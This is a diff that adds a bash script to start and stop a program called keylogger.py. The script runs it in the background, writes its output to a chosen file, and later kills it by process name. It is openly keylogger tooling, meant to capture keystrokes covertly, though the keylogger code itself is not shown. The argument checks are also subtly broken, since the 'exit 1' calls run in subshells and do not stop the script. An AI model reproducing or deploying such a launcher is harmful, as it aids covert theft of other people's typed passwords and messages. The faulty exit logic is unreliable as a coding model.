@@ -1,0 +1,22 @@
+#!/usr/bin/env bash
+# TODO: add echo printing relevant information
+usage() {
+  echo "Usage:" 1>&2
+  echo -e "\t$0 start process_name output_file" 1>&2
+  echo -e "\t$0 stop process_name"
+}
+
+[[ $# -eq 0 ]] && (usage; exit 1)
+
+if [[ $1 == "start" ]]; then
+  [[ $# -ne 3 ]] && (usage; exit 1)
+  ./keylogger.py "$2" >"$3" &
+elif [[ $1 == "stop" ]]; then
+  [[ $# -ne 2 ]] && (usage; exit 1)
+  pid_to_kill="$(pidof "$2")"
+  kill "$pid_to_kill"
+else
+  usage
+fi
+
+unset usage
